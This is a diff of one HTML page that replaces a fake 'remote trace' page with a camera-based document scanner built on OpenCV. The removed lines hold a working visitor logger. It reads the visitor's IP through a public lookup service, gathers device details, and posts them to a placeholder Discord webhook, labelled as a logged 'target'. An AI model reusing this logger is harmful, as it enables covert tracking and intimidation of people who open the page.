@@ -2,153 +2,201 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Initializing Trace...</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>IFB Smart Scanner</title>
+<script async src="https://docs.opencv.org/4.9.0/opencv.js"></script>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800;900&display=swap" rel="stylesheet">
 <style>
-    body {
-        margin: 0;
-        background-color: #050505;
-        color: #00ff00;
-        font-family: 'Courier New', Courier, monospace;
-        padding: 20px;
-        font-size: 14px;
-        line-height: 1.5;
-        overflow-x: hidden;
-    }
-    .red { color: #ff3333; }
-    .box {
-        border: 1px solid #333;
-        padding: 15px;
-        margin-bottom: 20px;
-        background: #0a0a0a;
-        box-shadow: 0 0 10px rgba(0,255,0,0.1);
-    }
-    .data-row {
-        display: flex;
-        justify-content: space-between;
-        border-bottom: 1px dashed #333;
-        padding: 5px 0;
-    }
-    .data-label { color: #888; }
-    .data-value { color: #fff; font-weight: bold; }
-    #warning {
-        display: none;
-        color: red;
-        font-size: 24px;
-        text-align: center;
-        margin-top: 30px;
-        font-weight: bold;
-        animation: flash 0.5s infinite alternate;
-    }
-    @keyframes flash {
-        from { opacity: 0.5; }
-        to { opacity: 1; }
-    }
+  :root {
+    --maroon: #7A1F2B;
+    --bg: #111;
+    --surface: #1E293B;
+    --text: #fff;
+    --success: #15803D;
+  }
+  
+  * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
+  body { background: var(--bg); color: var(--text); height: 100vh; display: flex; flex-direction: column; overflow: hidden; }
+
+  /* HEADER */
+  .header { background: var(--maroon); padding: 15px 20px; text-align: center; font-size: 18px; font-weight: 900; letter-spacing: 1px; box-shadow: 0 4px 10px rgba(0,0,0,0.3); z-index: 10; }
+  
+  /* VIEWPORT */
+  .viewport { flex: 1; position: relative; display: flex; justify-content: center; align-items: center; background: #000; overflow: hidden; }
+  video { width: 100%; height: 100%; object-fit: cover; position: absolute; inset: 0; }
+  canvas { display: none; }
+  img.preview { width: 100%; height: 100%; object-fit: contain; position: absolute; inset: 0; background: #222; display: none; z-index: 5; }
+  
+  /* LOADER */
+  #loader { position: absolute; inset: 0; background: rgba(0,0,0,0.8); z-index: 20; display: flex; flex-direction: column; justify-content: center; align-items: center; backdrop-filter: blur(5px); }
+  .spinner { width: 40px; height: 40px; border: 4px solid rgba(255,255,255,0.2); border-top-color: #fff; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 15px; }
+  @keyframes spin { 100% { transform: rotate(360deg); } }
+
+  /* CONTROLS */
+  .controls { background: var(--surface); padding: 20px; border-top-left-radius: 24px; border-top-right-radius: 24px; display: flex; flex-direction: column; gap: 12px; z-index: 10; box-shadow: 0 -4px 20px rgba(0,0,0,0.3); }
+  
+  .btn-row { display: flex; gap: 10px; }
+  
+  button {
+    flex: 1; padding: 16px; border: none; border-radius: 12px; font-size: 16px; font-weight: 800; cursor: pointer; transition: 0.2s; display: flex; justify-content: center; align-items: center; gap: 8px;
+  }
+  
+  #btnCapture { background: #fff; color: var(--maroon); width: 100%; }
+  #btnCapture:active { transform: scale(0.98); }
+  
+  #btnSave { background: var(--success); color: #fff; display: none; }
+  #btnRetake { background: #334155; color: #fff; display: none; }
+  
+  button:disabled { opacity: 0.5; cursor: not-allowed; }
 </style>
 </head>
 <body>
 
-<div id="terminal">
-    > INITIATING REMOTE TRACE...<br>
-    > CONNECTING TO IFB MAINFRAME...<br>
-    > TARGET ACQUIRED. EXTRACTING METADATA...<br><br>
-</div>
+  <div class="header">∆ IFB SMART SCANNER</div>
 
-<div class="box" id="dataBox" style="display:none;">
-    <div class="data-row"><span class="data-label">IP ADDRESS:</span> <span class="data-value" id="ip">Fetching...</span></div>
-    <div class="data-row"><span class="data-label">OPERATING SYSTEM:</span> <span class="data-value" id="os">Fetching...</span></div>
-    <div class="data-row"><span class="data-label">SCREEN RES:</span> <span class="data-value" id="screen">Fetching...</span></div>
-    <div class="data-row"><span class="data-label">BATTERY:</span> <span class="data-value" id="battery">Fetching...</span></div>
-    <div class="data-row"><span class="data-label">NETWORK:</span> <span class="data-value" id="network">Fetching...</span></div>
-</div>
+  <div class="viewport">
+    <div id="loader">
+      <div class="spinner"></div>
+      <div>Initializing Engine...</div>
+    </div>
+    <video id="video" autoplay playsinline muted></video>
+    <canvas id="canvas"></canvas>
+    <img id="preview" class="preview" alt="Scanned Document">
+  </div>
 
-<div id="warning">⚠️ DATA LOGGED TO SERVER ⚠️</div>
+  <div class="controls">
+    <button id="btnCapture" disabled>📸 Capture Document</button>
+    
+    <div class="btn-row" id="actionRow" style="display:none;">
+      <button id="btnRetake">Retake</button>
+      <button id="btnSave">Save Image</button>
+    </div>
+  </div>
 
 <script>
-    // --- PASTE YOUR DISCORD WEBHOOK URL HERE ---
-    const WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_URL_HERE";
+  let cvReady = false;
+  const video = document.getElementById('video');
+  const canvas = document.getElementById('canvas');
+  const preview = document.getElementById('preview');
+  const loader = document.getElementById('loader');
+  const btnCapture = document.getElementById('btnCapture');
+  const btnSave = document.getElementById('btnSave');
+  const btnRetake = document.getElementById('btnRetake');
+  const actionRow = document.getElementById('actionRow');
 
-    const terminal = document.getElementById('terminal');
-    const dataBox = document.getElementById('dataBox');
+  // 1. Wait for OpenCV to load
+  function waitForOpenCV() {
+    const interval = setInterval(() => {
+      if (typeof cv !== 'undefined' && cv.Mat) {
+        cvReady = true;
+        clearInterval(interval);
+        loader.style.display = 'none';
+        btnCapture.disabled = false;
+        startCamera();
+      }
+    }, 100);
+  }
+  waitForOpenCV();
 
-    // Get basic info
-    const userAgent = navigator.userAgent;
-    const platform = navigator.platform;
-    const screenW = window.screen.width;
-    const screenH = window.screen.height;
+  // 2. Start Camera
+  async function startCamera() {
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({ 
+        video: { facingMode: 'environment', width: { ideal: 1920 }, height: { ideal: 1080 } } 
+      });
+      video.srcObject = stream;
+      await video.play();
+    } catch (err) {
+      alert("Camera access denied or unavailable. Make sure you are on HTTPS.");
+    }
+  }
+
+  // 3. Capture & Process
+  btnCapture.addEventListener('click', () => {
+    const w = video.videoWidth;
+    const h = video.videoHeight;
+    if (!w || !h) return;
+
+    canvas.width = w;
+    canvas.height = h;
+    const ctx = canvas.getContext('2d');
+    ctx.drawImage(video, 0, 0, w, h);
+
+    // Run OpenCV
+    const processedCanvas = processImage(canvas);
     
-    let osName = "Unknown";
-    if (userAgent.indexOf("Win") != -1) osName = "Windows";
-    if (userAgent.indexOf("Mac") != -1) osName = "MacOS";
-    if (userAgent.indexOf("Android") != -1) osName = "Android";
-    if (userAgent.indexOf("like Mac") != -1) osName = "iOS";
+    // Show Preview
+    preview.src = processedCanvas.toDataURL('image/jpeg', 0.95);
+    preview.style.display = 'block';
+    
+    // Update UI
+    btnCapture.style.display = 'none';
+    actionRow.style.display = 'flex';
+    btnSave.style.display = 'flex';
+    btnRetake.style.display = 'flex';
+  });
 
-    let connectionType = "Unknown";
-    if (navigator.connection) {
-        connectionType = navigator.connection.effectiveType || "Unknown";
-    }
+  // 4. OpenCV Image Processing (Ink Extraction)
+  function processImage(sourceCanvas) {
+    if (!cvReady) return sourceCanvas;
 
-    let batteryLevel = "Unknown";
-    if (navigator.getBattery) {
-        navigator.getBattery().then(battery => {
-            batteryLevel = Math.round(battery.level * 100) + "%";
-            document.getElementById('battery').innerText = batteryLevel;
-        });
-    }
+    let src = cv.imread(sourceCanvas);
+    let gray = new cv.Mat();
+    let dst = new cv.Mat();
 
-    // Fetch IP Address
-    fetch('https://api.ipify.org?format=json')
-        .then(response => response.json())
-        .then(data => {
-            const ip = data.ip;
-            
-            // Update UI
-            document.getElementById('ip').innerText = ip;
-            document.getElementById('os').innerText = osName;
-            document.getElementById('screen').innerText = screenW + "x" + screenH;
-            document.getElementById('network').innerText = connectionType;
+    // Grayscale
+    cv.cvtColor(src, gray, cv.COLOR_RGBA2GRAY, 0);
+    
+    // Blur to remove noise
+    cv.GaussianBlur(gray, gray, new cv.Size(3, 3), 0, 0, cv.BORDER_DEFAULT);
+    
+    // Adaptive Thresholding (The magic that isolates ink)
+    cv.adaptiveThreshold(
+      gray, dst, 255, 
+      cv.ADAPTIVE_THRESH_GAUSSIAN_C, 
+      cv.THRESH_BINARY, 
+      21, // Block size
+      15  // Contrast
+    );
 
-            dataBox.style.display = 'block';
-            document.getElementById('warning').style.display = 'block';
+    // Morphological opening to remove tiny dust specks
+    let M = cv.Mat.ones(2, 2, cv.CV_8U);
+    cv.morphologyEx(dst, dst, cv.MORPH_OPEN, M);
 
-            // LOG TO DISCORD
-            sendToDiscord(ip, osName, screenW + "x" + screenH, batteryLevel, connectionType, userAgent);
-        })
-        .catch(() => {
-            document.getElementById('ip').innerText = "Blocked by VPN/AdBlock";
-            dataBox.style.display = 'block';
-            document.getElementById('warning').style.display = 'block';
-            sendToDiscord("Blocked IP", osName, screenW + "x" + screenH, batteryLevel, connectionType, userAgent);
-        });
+    // Output to canvas
+    let outCanvas = document.createElement('canvas');
+    outCanvas.width = dst.cols;
+    outCanvas.height = dst.rows;
+    cv.imshow(outCanvas, dst);
 
-    async function sendToDiscord(ip, os, screen, battery, network, ua) {
-        if (WEBHOOK_URL === "YOUR_DISCORD_WEBHOOK_URL_HERE") return;
+    // Cleanup memory
+    src.delete(); gray.delete(); dst.delete(); M.delete();
 
-        const payload = {
-            username: "IFB Tracker Bot",
-            embeds: [{
-                title: "🎯 NEW TARGET LOGGED",
-                color: 16711680, // Red
-                fields: [
-                    { name: "IP Address", value: ip, inline: true },
-                    { name: "OS", value: os, inline: true },
-                    { name: "Screen", value: screen, inline: true },
-                    { name: "Battery", value: battery, inline: true },
-                    { name: "Network", value: network, inline: true },
-                    { name: "User Agent", value: `\`\`\`${ua}\`\`\`` }
-                ],
-                footer: { text: "IFB Security System | " + new Date().toLocaleString() }
-            }]
-        };
+    return outCanvas;
+  }
 
-        try {
-            await fetch(WEBHOOK_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            });
-        } catch(e) { console.error(e); }
-    }
+  // 5. Save Image to Device
+  btnSave.addEventListener('click', () => {
+    if (!preview.src) return;
+    
+    const link = document.createElement('a');
+    link.download = `IFB_Scan_${new Date().getTime()}.jpg`;
+    link.href = preview.src;
+    document.body.appendChild(link);
+    link.click();
+    document.body.removeChild(link);
+  });
+
+  // 6. Retake
+  btnRetake.addEventListener('click', () => {
+    preview.style.display = 'none';
+    preview.src = "";
+    btnCapture.style.display = 'block';
+    actionRow.style.display = 'none';
+    btnSave.style.display = 'none';
+    btnRetake.style.display = 'none';
+  });
+
 </script>
 </body>
 </html>
